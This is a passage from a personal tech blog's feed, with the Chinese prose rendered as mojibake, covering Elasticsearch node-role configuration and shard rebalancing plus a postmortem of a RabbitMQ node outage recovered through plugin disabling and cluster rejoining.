href="https://www.elastic.co/guide/en/elasticsearch/reference/2.4/modules-node.html" target="_blank" rel="noopener">Node</a></p><p>å…³äºESçš„èŠ‚ç‚¹ä»‹ç»:</p><p>Elasticsearché›†ç¾¤çš„æ¯ä¸ªelasticsearchå®ä¾‹éƒ½æ˜¯ä¸€ä¸ªnodeèŠ‚ç‚¹.å¤šä¸ªnodeèŠ‚ç‚¹ç»„æˆäº†ä¸€ä¸ªcluster.</p><p>é›†ç¾¤çš„æ¯ä¸ªèŠ‚ç‚¹é»˜è®¤éƒ½èƒ½å¤„ç†httpå’Œä¼ è¾“å±‚æµé‡.ä¼ è¾“å±‚ä¸“é—¨ç”¨äºèŠ‚ç‚¹ä¹‹é—´ä»¥åŠèŠ‚ç‚¹å’ŒJava TransportClientä¹‹é—´çš„é€šä¿¡; HTTPå±‚ä»…ç”±å¤–éƒ¨RESTå®¢æˆ·ç«¯ä½¿ç”¨ã€‚</p><p>æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯ä»¥è½¬å‘å®¢æˆ·ç«¯è¯·æ±‚åˆ°åˆé€‚çš„å…¶ä»–èŠ‚ç‚¹,é™¤æ­¤ä¹‹å¤–,æ¯ä¸ªèŠ‚ç‚¹æœåŠ¡å™¨è¿˜å¯ä»¥æ‰¿æ‹…å¦‚ä¸‹è§’è‰²:</p><ul><li>Master node</li></ul><p>é»˜è®¤æƒ…å†µä¸‹,æ¯ä¸ªèŠ‚ç‚¹éƒ½æ˜¯Master.masterèŠ‚ç‚¹ä¸ä»£è¡¨è¿™ä¸ªèŠ‚ç‚¹å°±æ˜¯masterè§’è‰²,è€Œæ˜¯ä»£è¡¨è¿™ä¸ªèŠ‚ç‚¹æœ‰å‚åŠ masteré€‰ä¸¾çš„èµ„æ ¼.masterèŠ‚ç‚¹æ§åˆ¶æ•´ä¸ªé›†ç¾¤</p><p>é€šè¿‡å¦‚ä¸‹æ–¹å¼è®¾ç½®ä¸ºä»…ä¸ºmasterèŠ‚ç‚¹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node.master: true</span><br><span class="line">node.data: false</span><br><span class="line">node.client: false</span><br></pre></td></tr></table></figure><p>masterèŠ‚ç‚¹ä¸ä¼šå­˜å‚¨æ•°æ®ï¼Œæœ‰æˆä¸ºä¸»èŠ‚ç‚¹çš„èµ„æ ¼ï¼Œå¯ä»¥å‚ä¸é€‰ä¸¾ï¼Œæœ‰å¯èƒ½æˆä¸ºçœŸæ­£çš„ä¸»èŠ‚ç‚¹ã€‚æ™®é€šæœåŠ¡å™¨å³å¯(CPUã€å†…å­˜æ¶ˆè€—ä¸€èˆ¬)ã€‚</p><ul><li>Data node</li></ul><p>é»˜è®¤æƒ…å†µä¸‹,æ¯ä¸ªèŠ‚ç‚¹éƒ½æ˜¯DataèŠ‚ç‚¹,DateèŠ‚ç‚¹ä¿å­˜æ•°æ®,å¹¶ä¸”æ‰§è¡Œä¸æ•°æ®ç›¸å…³çš„æ“ä½œ,ä¾‹å¦‚æœç´¢,èšåˆ.</p><p>èŠ‚ç‚¹æ²¡æœ‰æˆä¸ºä¸»èŠ‚ç‚¹çš„èµ„æ ¼ï¼Œä¸å‚ä¸é€‰ä¸¾ï¼Œåªä¼šå­˜å‚¨æ•°æ®ã€‚åœ¨é›†ç¾¤ä¸­éœ€è¦å•ç‹¬è®¾ç½®å‡ ä¸ªè¿™æ ·çš„èŠ‚ç‚¹è´Ÿè´£å­˜å‚¨æ•°æ®ï¼ŒåæœŸæä¾›å­˜å‚¨å’ŒæŸ¥è¯¢æœåŠ¡ã€‚ä¸»è¦æ¶ˆè€—ç£ç›˜ï¼Œå†…å­˜ã€‚</p><p>é€šè¿‡å¦‚ä¸‹æ–¹å¼è®¾ç½®ä¸ºä»…ä¸ºæ•°æ®èŠ‚ç‚¹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node.master: false</span><br><span class="line">node.data: true</span><br><span class="line">node.client: false</span><br></pre></td></tr></table></figure><ul><li>Client node</li></ul><p>clientèŠ‚ç‚¹ä¸ä¼šä¿å­˜æ•°æ®,ä¹Ÿä¸ä¼šæˆä¸ºmasterè§’è‰²,clientèŠ‚ç‚¹ç”¨æ¥è½¬å‘å®¢æˆ·ç«¯çš„è¯·æ±‚åˆ°masterèŠ‚ç‚¹, è½¬å‘æ•°æ®ç›¸å…³çš„æ“ä½œè¯·æ±‚(ä¾‹å¦‚æœç´¢)åˆ°dataèŠ‚ç‚¹,</p><p>é€šè¿‡å¦‚ä¸‹æ–¹å¼è®¾ç½®ä¸ºä»…ä¸ºclientèŠ‚ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node.master: false</span><br><span class="line">node.data: false</span><br></pre></td></tr></table></figure><p>ä¸ä¼šæˆä¸ºä¸»èŠ‚ç‚¹ï¼Œä¹Ÿä¸ä¼šå­˜å‚¨æ•°æ®ï¼Œä¸»è¦æ˜¯é’ˆå¯¹æµ·é‡è¯·æ±‚çš„æ—¶å€™å¯ä»¥è¿›è¡Œè´Ÿè½½å‡è¡¡ã€‚æ™®é€šæœåŠ¡å™¨å³å¯ï¼ˆå¦‚æœè¦è¿›è¡Œåˆ†ç»„èšåˆæ“ä½œçš„è¯ï¼Œå»ºè®®è¿™ä¸ªèŠ‚ç‚¹å†…å­˜ä¹Ÿåˆ†é…å¤šä¸€ç‚¹ï¼‰</p><hr><ul><li><strong>èŠ‚ç‚¹è§„åˆ’</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">master èŠ‚ç‚¹ ï¼ˆç®¡ç†é›†ç¾¤ä½œç”¨ï¼‰</span><br><span class="line"></span><br><span class="line">hsq-es2</span><br><span class="line">hsq-es2-mqslave</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data æ•°æ®èŠ‚ç‚¹ æ•°æ®è½åœ°æŸ¥è¯¢</span><br><span class="line"></span><br><span class="line">hsq-es2 è¯¥èŠ‚ç‚¹ä¹Ÿä½œä¸ºmasterèŠ‚ç‚¹ </span><br><span class="line">hsq-es3</span><br><span class="line">hsq-es4</span><br><span class="line">hsq-es5</span><br><span class="line">hsq-es6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">clientèŠ‚ç‚¹ï¼ˆä¸ä½œä¸ºmasterèŠ‚ç‚¹ ä¹Ÿä¸ä½œä¸ºdata èŠ‚ç‚¹ï¼‰ è´Ÿè½½å’Œèšåˆ</span><br><span class="line"></span><br><span class="line">hsq-es2-mqmaster</span><br><span class="line">hsq-es1</span><br></pre></td></tr></table></figure><p>é™„ä¸Šhsq-es6çš„é…ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim elasticsearch.yml</span><br><span class="line"></span><br><span class="line">node.name: hsq-es6</span><br><span class="line">node.master: false</span><br><span class="line">node.data: true</span><br><span class="line">node.client: false</span><br></pre></td></tr></table></figure><hr><ul><li><strong>ä¸»åˆ†ç‰‡ä¼˜åŒ–</strong></li></ul><p>è®¿é—®<a href="http://es.haoshiqi.net/_plugin/kopf/#!/nodes" target="_blank" rel="noopener">http://es.haoshiqi.net/_plugin/kopf/#!/nodes</a> å¯ä»¥çœ‹åˆ°é›†ç¾¤æ‰€æœ‰èŠ‚ç‚¹</p><p><img src="/Users/huangyong/Desktop/es-1.png" alt=""></p><p>å…¶ä¸­å¯ä»¥çœ‹åˆ°æœ‰2å°masterèŠ‚ç‚¹,2å°clientèŠ‚ç‚¹,4å°dataèŠ‚ç‚¹</p><p>å°†ä¸»åˆ†ç‰‡å¹³å‡åˆ†æ‹…åˆ°å„ä¸ªdateèŠ‚ç‚¹,å¦‚ä¸‹æ‰€ç¤º</p><p><img src="/Users/huangyong/Desktop/es-2.png" alt=""></p><p>é«˜äº®æ˜¾ç¤ºçš„ä¸ºä¸»åˆ†ç‰‡</p><p>è°ƒæ•´ä¸»åˆ†ç‰‡æ–¹æ³•å¦‚ä¸‹:</p><p>1.å·¦é”®ç‚¹å‡»é«˜äº®ä¸»åˆ†ç‰‡.ç‚¹å‡»â€select for relocationâ€</p><p><img src="/Users/huangyong/Desktop/es-3.png" alt=""></p><p>2.ç‚¹å‡»éœ€è¦è°ƒæ•´åçš„ä½ç½®</p><p><img src="/Users/huangyong/Desktop/es-4.png" alt=""></p><p>3.è°ƒæ•´åç»“æœå¦‚ä¸‹</p><p><img src="/Users/huangyong/Desktop/es-5.png" alt=""></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ESé›†ç¾¤ä¼˜åŒ–&quot;&gt;&lt;a href=&quot;#ESé›†ç¾¤ä¼˜åŒ–&quot; class=&quot;headerlink&quot; title=&quot;ESé›†ç¾¤ä¼˜åŒ–&quot;&gt;&lt;/a&gt;ESé›†ç¾¤ä¼˜åŒ–&lt;/h3&gt;&lt;h4 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h4&gt;&lt;p&gt;æ—¶é—´:2019å¹´01æœˆ3å·&lt;/p&gt;
&lt;p&gt;æ”¯ä»˜å®äº”ç¦æ´»åŠ¨å‹æµ‹æœŸé—´&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;ESé›†ç¾¤æ¶æ„&quot;&gt;&lt;a href=&quot;#ESé›†ç¾¤æ¶æ„&quot; class=&quot;headerlink&quot; title=&quot;ESé›†ç¾¤æ¶æ„&quot;&gt;&lt;/a&gt;ESé›†ç¾¤æ¶æ„&lt;/h4&gt;&lt;p&gt;elasticsearchç‰ˆæœ¬:2.4.6&lt;/p&gt;
&lt;p&gt;ESé›†ç¾¤æœåŠ¡å™¨: 8å°.å…¶ä¸­5å°16c32g.3å°8c16g&lt;/p&gt;
&lt;p&gt;æœåŠ¡å™¨èŠ‚ç‚¹: mq-master,mq-slave,hsq-es1,hsq-es2,hsq-es3,hsq-es4,hsq-es5,hsq-es6&lt;/p&gt;
    
    </summary>
    
      <category term="elasticsearch" scheme="https://jesse.top/categories/elasticsearch/"/>
    
    
      <category term="elasticsearch" scheme="https://jesse.top/tags/elasticsearch/"/>
    
  </entry>
  
  <entry>
    <title>çº¿ä¸ŠMQå®•æœºå¤ç›˜</title>
    <link href="https://jesse.top/2018/11/21/Linux-%E5%88%86%E5%B8%83%E5%BC%8F&amp;%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/mq/%E7%BA%BF%E4%B8%8AMQ%E5%AE%95%E6%9C%BA%E5%A4%8D%E7%9B%98/"/>
    <id>https://jesse.top/2018/11/21/Linux-åˆ†å¸ƒå¼&amp;æ¶ˆæ¯é˜Ÿåˆ—/mq/çº¿ä¸ŠMQå®•æœºå¤ç›˜/</id>
    <published>2018-11-21T09:59:58.000Z</published>
    <updated>2018-12-01T15:07:13.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="çº¿ä¸ŠMQå®•æœºå¤ç›˜"><a href="#çº¿ä¸ŠMQå®•æœºå¤ç›˜" class="headerlink" title="çº¿ä¸ŠMQå®•æœºå¤ç›˜"></a>çº¿ä¸ŠMQå®•æœºå¤ç›˜</h2><hr><h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><p>æ—¶é—´:2018å¹´11æœˆ20å·æ™šä¸Š10ç‚¹40</p><p>æœåŠ¡å™¨:mq-slave</p><p>æ•…éšœç°è±¡: é’‰é’‰æ”¶åˆ°æŠ¥è­¦MQæœåŠ¡å™¨çš„rabbitmqè¿›ç¨‹æŒ‚äº†.æ‰‹åŠ¨å¯åŠ¨å,è¿‡ä¸€ä¼šè¶…æ—¶é€€å‡º</p><a id="more"></a><hr><p>1.æŸ¥çœ‹æ—¥å¿—.æç¤ºdelayed_messageæ’ä»¶è¶…æ—¶.æ— æ³•å¯åŠ¨.</p><p>è”ç³»å¼€å‘.å¯èƒ½æ˜¯ç™½å¤©ä¿®æ”¹äº†å»¶æ—¶é˜Ÿåˆ—æœºåˆ¶çš„ç¼˜æ•…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less /var/log/rabbitmq/rabbit@node2</span><br><span class="line"></span><br><span class="line">Error: &#123;&#123;case_clause,&#123;timeout,[rabbit_delayed_messagerabbit@node2]&#125;&#125;, [&#123;rabbit_boot_steps,&apos;-run_step/2-lc$^1/1-1-&apos;,1, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,49&#125;]&#125;, &#123;rabbit_boot_steps,run_step,2, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,49&#125;]&#125;, &#123;rabbit_boot_steps,&apos;-run_boot_steps/1-lc$^0/1-0-&apos;,1, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,26&#125;]&#125;, &#123;rabbit_boot_steps,run_boot_steps,1, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,26&#125;]&#125;, &#123;rabbit,start_apps,1,[&#123;file,&quot;src/rabbit.erl&quot;&#125;,&#123;line,447&#125;]&#125;, &#123;rabbit_plugins,ensure,1,[&#123;file,&quot;src/rabbit_plugins.erl&quot;&#125;,&#123;line,49&#125;]&#125;, &#123;rpc,&apos;-handle_call_call/6-fun-0-&apos;,5,[&#123;file,&quot;rpc.erl&quot;&#125;,&#123;line,206&#125;]&#125;]&#125;</span><br></pre></td></tr></table></figure><p>2.å…³é—­è¯¥æ’ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmq-plugins disable rabbitmq_delayed_message_exchange</span><br><span class="line">he following plugins have been disabled: </span><br><span class="line">rabbitmq_delayed_message_exchange</span><br></pre></td></tr></table></figure><p>3.å†æ¬¡å¯åŠ¨.å¯ä»¥æˆåŠŸå¯åŠ¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# service rabbitmq-server start</span><br></pre></td></tr></table></figure><p>4.å°è¯•æ‰‹åŠ¨å¯åŠ¨è¯¥æ’ä»¶.ä»ç„¶è¶…æ—¶å¤±è´¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmq-plugins enable rabbitmq_delayed_message_exchange</span><br><span class="line"></span><br><span class="line">The following plugins have been enabled:</span><br><span class="line">rabbitmq_delayed_message_exchange</span><br><span class="line"></span><br><span class="line">Applying plugin configuration to rabbit@node2... failed. Error: &#123;&#123;case_clause,&#123;timeout,[rabbit_delayed_messagerabbit@node2]&#125;&#125;, [&#123;rabbit_boot_steps,&apos;-run_step/2-lc$^1/1-1-&apos;,1, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,49&#125;]&#125;, &#123;rabbit_boot_steps,run_step,2, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,49&#125;]&#125;, &#123;rabbit_boot_steps,&apos;-run_boot_steps/1-lc$^0/1-0-&apos;,1, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,26&#125;]&#125;, &#123;rabbit_boot_steps,run_boot_steps,1, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,26&#125;]&#125;, &#123;rabbit,start_apps,1,[&#123;file,&quot;src/rabbit.erl&quot;&#125;,&#123;line,447&#125;]&#125;, &#123;rabbit_plugins,ensure,1,[&#123;file,&quot;src/rabbit_plugins.erl&quot;&#125;,&#123;line,49&#125;]&#125;, &#123;rpc,&apos;-handle_call_call/6-fun-0-&apos;,5,[&#123;file,&quot;rpc.erl&quot;&#125;,&#123;line,206&#125;]&#125;]&#125;</span><br></pre></td></tr></table></figure><p>5.åœæ­¢rabbitmqæœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# service rabbitmq-server stop</span><br></pre></td></tr></table></figure><hr><p>è”ç³»å¼€å‘.å¯èƒ½æ˜¯å»¶è¿Ÿé˜Ÿåˆ—æ¶ˆæ¯å¤ªå¤š,å°†æœåŠ¡å™¨çš„MQç¨‹åºå¡æ­»,å¯¼è‡´æ’ä»¶æ— å“åº”.ä»è€Œæ— æ³•å¯åŠ¨.ç”±äºMQä½¿ç”¨äº†2å°æœåŠ¡å™¨åº§ä½é›†ç¾¤,è€Œä¸”ä½¿ç”¨äº†é•œåƒé˜Ÿåˆ—æ–¹å¼.æ‰€ä»¥æ¸…æ´—mq-slaveæœåŠ¡å™¨è¿™å°æœåŠ¡å™¨çš„æ•°æ®.é‡æ–°å¯åŠ¨.</p><p>ç¡®å®šæ˜¯å¦ä½¿ç”¨é•œåƒé˜Ÿåˆ—æ–¹å¼å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl list_policies</span><br><span class="line">Listing policies ...</span><br><span class="line">/ha-allall^&#123;&quot;ha-mode&quot;:&quot;all&quot;,&quot;ha-sync-mode&quot;:&quot;automatic&quot;&#125;0</span><br></pre></td></tr></table></figure><p>ha-mode: ä»£è¡¨ä½¿ç”¨é•œåƒé˜Ÿåˆ—.</p><p>ha-sync-mode:è¡¨ç¤ºè‡ªåŠ¨åŒæ­¥æ•°æ®</p><p>æ›´å¤šä¿¡æ¯è¯·ç½‘ä¸Šæœç´¢</p><hr><p>1.å…³é—­æ’ä»¶,é‡æ–°å¯åŠ¨rabbitmqè¿›ç¨‹.(å› ä¸ºæ¸…é™¤æ•°æ®éœ€è¦å…ˆå¯åŠ¨rabbitmqè¿›ç¨‹)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# service rabbitmq-server start</span><br></pre></td></tr></table></figure><p>2.å°†è¿™å°æœåŠ¡å™¨ä»é›†ç¾¤èŠ‚ç‚¹æ‹¿æ‰.ä¸ç„¶æ¸…æ¥šæ•°æ®ä¼šå½±å“ç°æœ‰çš„ç”Ÿäº§ç¯å¢ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl stop_app</span><br><span class="line">Stopping node rabbit@node2 ...</span><br></pre></td></tr></table></figure><p>3.æ•°æ®åˆ é™¤å®Œæ¯•å,é‡æ–°å¯åŠ¨rabbitmqèŠ‚ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl start_app Starting node rabbit@node2 ...</span><br></pre></td></tr></table></figure><p>4.å¯åŠ¨æ’ä»¶.æ˜¾ç¤ºå·²ç»å¯åŠ¨äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">oot@node2:~# rabbitmq-plugins enable rabbitmq_delayed_message_exchange</span><br><span class="line">Plugin configuration unchanged.</span><br><span class="line">Applying plugin configuration to rabbit@node2... nothing to do.</span><br></pre></td></tr></table></figure><p>5.æ˜¾ç¤ºæ’ä»¶,æŸ¥çœ‹ç¡®å®å·²ç»æˆåŠŸå¯åŠ¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmq-plugins list -E</span><br><span class="line"></span><br><span class="line">Configured: E = explicitly enabled; e = implicitly enabled</span><br><span class="line"> | Status:   * = running on rabbit@node2</span><br><span class="line"> |/</span><br><span class="line">[E*] rabbitmq_delayed_message_exchange 0.0.1</span><br><span class="line">[E*] rabbitmq_management               3.6.3</span><br></pre></td></tr></table></figure><p>6.æŸ¥çœ‹èŠ‚ç‚¹çŠ¶æ€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl status</span><br></pre></td></tr></table></figure><p>7.æŸ¥çœ‹é›†ç¾¤çŠ¶æ€.å¯ä»¥çœ‹åˆ°åªè¯†åˆ«åˆ°æœ¬èº«è¿™å°çš„èŠ‚ç‚¹,æ²¡æœ‰åŠ å…¥åˆ°é›†ç¾¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl cluster_status </span><br><span class="line"></span><br><span class="line">Cluster status of node rabbit@node2 ... </span><br><span class="line">[&#123;nodes,[&#123;disc,[rabbit@node2]&#125;]&#125;, </span><br><span class="line">&#123;running_nodes,[rabbit@node2]&#125;,</span><br><span class="line">&#123;cluster_name,&lt;&lt;&quot;rabbit@node2&quot;&gt;&gt;&#125;, </span><br><span class="line">&#123;partitions,[]&#125;, &#123;alarms,[&#123;rabbit@node2,[]&#125;]&#125;]</span><br></pre></td></tr></table></figure><p>8.å…³é—­è¿™å°æœåŠ¡å™¨èŠ‚ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl stop_app Stopping node rabbit@node2 ...</span><br></pre></td></tr></table></figure><p>9.åŠ å…¥å¦å¤–ä¸€å°node1çš„é›†ç¾¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl join_cluster rabbit@node1 </span><br><span class="line">Clustering node rabbit@node2 with rabbit@node1 ...</span><br></pre></td></tr></table></figure><p>10.å¯åŠ¨èŠ‚ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl start_app </span><br><span class="line">Starting node rabbit@node2 ...</span><br></pre></td></tr></table></figure><p>11.æŸ¥çœ‹é›†ç¾¤çŠ¶æ€.å¯ä»¥çœ‹åˆ°2ä¸ªèŠ‚ç‚¹éƒ½è¯†åˆ«åˆ°äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl cluster_status</span><br><span class="line">Cluster status of node rabbit@node2 ...</span><br><span class="line">[&#123;nodes,[&#123;disc,[rabbit@node1,rabbit@node2]&#125;]&#125;,</span><br><span class="line"> &#123;running_nodes,[rabbit@node1,rabbit@node2]&#125;,</span><br><span class="line"> &#123;cluster_name,&lt;&lt;&quot;rabbit@node1&quot;&gt;&gt;&#125;,</span><br><span class="line"> &#123;partitions,[]&#125;,</span><br><span class="line"> &#123;alarms,[&#123;rabbit@node1,[]&#125;,&#123;rabbit@node2,[]&#125;]&#125;]</span><br><span class="line">root@node2:~#</span><br></pre></td></tr></table></figure><p>12.æŸ¥çœ‹æ—¥å¿—,å¯ä»¥çœ‹åˆ°é›†ç¾¤æ­£åœ¨å¾€è¯¥èŠ‚ç‚¹ä¸ŠåŒæ­¥æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">=WARNING REPORT==== 21-Nov-2018::00:39:47 === msg_store_persistent: rebuilding indices from scratch</span><br><span class="line"></span><br><span class="line">=INFO REPORT==== 21-Nov-2018::00:39:48 === Mirrored queue &apos;hsq.marketingcenter.finish_pin_event&apos; in vhost &apos;/&apos;: Adding mirror on node rabbit@node2: &lt;0.11440.0&gt;</span><br><span class="line"></span><br><span class="line">=INFO REPORT==== 21-Nov-2018::00:39:48 === Mirrored queue &apos;hsq.msgcenter.app_push_notification&apos; in vhost &apos;/&apos;: Adding mirror on node rabbit@node2: &lt;0.11444.0&gt;</span><br><span class="line"></span><br><span class="line">=INFO REPORT==== 21-Nov-2018::00:39:48 === Mirrored queue &apos;hsq.msgcenter.lottery_push_notification&apos; in vhost &apos;/&apos;: Adding mirror on node rabbit@node2: &lt;0.11448.0&gt;</span><br><span class="line"></span><br><span class="line">=INFO REPORT==== 21-Nov-2018::00:39:48 === Mirrored queue &apos;push_robot&apos; in vhost &apos;/&apos;: Adding mirror on node rabbit@node2: &lt;0.11452.0&gt;</span><br><span class="line"></span><br><span class="line">=INFO REPORT==== 21-Nov-2018::00:39:48 === Mirrored queue &apos;hsq.tradecenter.refund_point&apos; in vhost &apos;/&apos;: Adding mirror on node rabbit@node2: &lt;0.11456.0&gt;</span><br></pre></td></tr></table></figure><p>13.åœ¨æœ¬èŠ‚ç‚¹ä¸ŠæŸ¥çœ‹é˜Ÿåˆ—.å¯ä»¥çœ‹åˆ°é˜Ÿåˆ—å·²ç»åŒæ­¥è¿‡æ¥äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl list_queues</span><br></pre></td></tr></table></figure><p>å¦å¤–åœ¨webæ§åˆ¶å°ä¸Šè¿˜èƒ½çœ‹åˆ°æ›´è¯¦ç»†çš„ä¿¡æ¯.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;çº¿ä¸ŠMQå®•æœºå¤ç›˜&quot;&gt;&lt;a href=&quot;#çº¿ä¸ŠMQå®•æœºå¤ç›˜&quot; class=&quot;headerlink&quot; title=&quot;çº¿ä¸ŠMQå®•æœºå¤ç›˜&quot;&gt;&lt;/a&gt;çº¿ä¸ŠMQå®•æœºå¤ç›˜&lt;/h2&gt;&lt;hr&gt;
&lt;h3 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h3&gt;&lt;p&gt;æ—¶é—´:2018å¹´11æœˆ20å·æ™šä¸Š10ç‚¹40&lt;/p&gt;
&lt;p&gt;æœåŠ¡å™¨:mq-slave&lt;/p&gt;
&lt;p&gt;æ•…éšœç°è±¡: é’‰é’‰æ”¶åˆ°æŠ¥è­¦MQæœåŠ¡å™¨çš„rabbitmqè¿›ç¨‹æŒ‚äº†.æ‰‹åŠ¨å¯åŠ¨å,è¿‡ä¸€ä¼šè¶…æ—¶é€€å‡º&lt;/p&gt;
    
    </summary>
    
      <category term="Linux-åˆ†å¸ƒå¼&amp;æ¶ˆæ¯é˜Ÿåˆ—" scheme="https://jesse.top/categories/Linux-%E5%88%86%E5%B8%83%E5%BC%8F-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"/>
    
    
      <category term="MQ" scheme="https://jesse.top/tags/MQ/"/>
    
  </entry>
  
  <entry>
    <title>vimä½¿ç”¨æŠ€å·§</title>
    <link href="https://jesse.top/2018/11/21/Linux-Basic/%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86/vim%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <id>https://jesse.top/2018/11/21/Linux-Basic/æ–‡æœ¬å¤„ç†/vimä½¿ç”¨æŠ€å·§/</id>
    <published>2018-11-21T04:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.287Z</updated>
    
